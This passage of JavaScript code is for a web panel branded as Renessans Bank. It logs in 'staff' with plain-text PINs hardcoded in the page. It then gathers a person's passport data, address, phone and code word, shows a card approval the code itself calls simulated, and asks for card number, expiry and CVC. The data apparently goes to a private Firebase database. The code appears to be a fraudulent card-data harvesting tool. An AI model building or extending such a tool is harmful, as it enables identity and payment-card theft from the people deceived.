// === ТВОЙ FIREBASE URL ===
const DATABASE_URL = "https://renessans-bank-3df94-default-rtdb.europe-west1.firebasedatabase.app";

// Сотрудники
const STAFF = {
  "Ирина": "8992",
  "Арсений": "9274",
  "Ольга": "9274",
  "dem": "1265",
  "renessans": "1265"
};

let currentUser = null;

// Вход
function login() {
  const l = document.getElementById("login").value.trim();
  const p = document.getElementById("password").value;
  if (STAFF[l] === p) {
    currentUser = l;
    document.getElementById("loginScreen").style.display = "none";
    document.getElementById("mainScreen").style.display = "block";
    document.getElementById("error").textContent = "";
  } else {
    document.getElementById("error").textContent = "Неверный логин или пароль";
  }
}

function logout() {
  currentUser = null;
  document.getElementById("mainScreen").style.display = "none";
  document.getElementById("loginScreen").style.display = "block";
}

function showSection(id) {
  document.getElementById("cardsSection").style.display = "none";
  document.getElementById("manageSection").style.display = "none";
  document.getElementById("requestSection").style.display = "none";
  document.getElementById(id + "Section").style.display = "block";
}

// === ОФОРМЛЕНИЕ КАРТЫ ===
function selectCardType(type) {
  let form = `<h3>Анкета: ${type} карта</h3>`;
  form += `
    <input type="text" id="fio" placeholder="ФИО" required>
    <input type="date" id="birthDate" required>
    <input type="text" id="passport" placeholder="Паспорт" required>
    <input type="tel" id="phone" placeholder="Телефон" required>
    <input type="email" id="email" placeholder="Email">
    <input type="text" id="address" placeholder="Адрес" required>
    <input type="text" id="codeWord" placeholder="Кодовое слово" required>
  `;

  if (type === "кредитная") {
    form += `
      <input type="number" id="income" placeholder="Доход (руб.)" required>
      <select id="loanPurpose" required>
        <option value="">Цель кредита</option>
        <option value="Покупка техники">Покупка техники</option>
        <option value="Ремонт">Ремонт</option>
        <option value="Путешествие">Путешествие</option>
        <option value="Образование">Образование</option>
        <option value="Другое">Другое</option>
      </select>
    `;
  }

  form += `<button onclick="submitCard('${type}')">Подать заявку</button>`;
  document.getElementById("cardForm").innerHTML = form;
  document.getElementById("cardForm").style.display = "block";
}

function submitCard(type) {
  const data = {
    type: type,
    fio: document.getElementById("fio").value,
    birthDate: document.getElementById("birthDate").value,
    passport: document.getElementById("passport").value,
    phone: document.getElementById("phone").value,
    email: document.getElementById("email").value,
    address: document.getElementById("address").value,
    codeWord: document.getElementById("codeWord").value,
    staff: currentUser,
    timestamp: new Date().toISOString()
  };

  if (type === "кредитная") {
    const income = document.getElementById("income").value;
    if (income < 30000) {
      alert("❌ Отказано: доход ниже 30 000 руб.");
      return;
    }
    data.income = income;
    data.loanPurpose = document.getElementById("loanPurpose").value;
  }

  // Имитация выдачи карты
  alert("✅ Карта одобрена! Введите реквизиты.");
  proceedToCardDetails(data);
}

function proceedToCardDetails(data) {
  const form = `
    <h3>Реквизиты карты</h3>
    <input type="text" id="cardNumber" placeholder="Номер карты" required>
    <input type="text" id="expiry" placeholder="Годен до (ММ/ГГ)" required>
    <input type="text" id="cvc" placeholder="CVC" required>
    <textarea id="notes" placeholder="Примечания"></textarea>
    <button onclick="finalizeCard(${JSON.stringify(data).replace(/"/g, '&quot;')})">Завершить</button>
  `;
  document.getElementById("cardForm").innerHTML = form;
}

function finalizeCard(data) {
  data.cardNumber = document.getElementById("cardNumber").value;
  data.expiry = document.getElementById("expiry").value;
  data
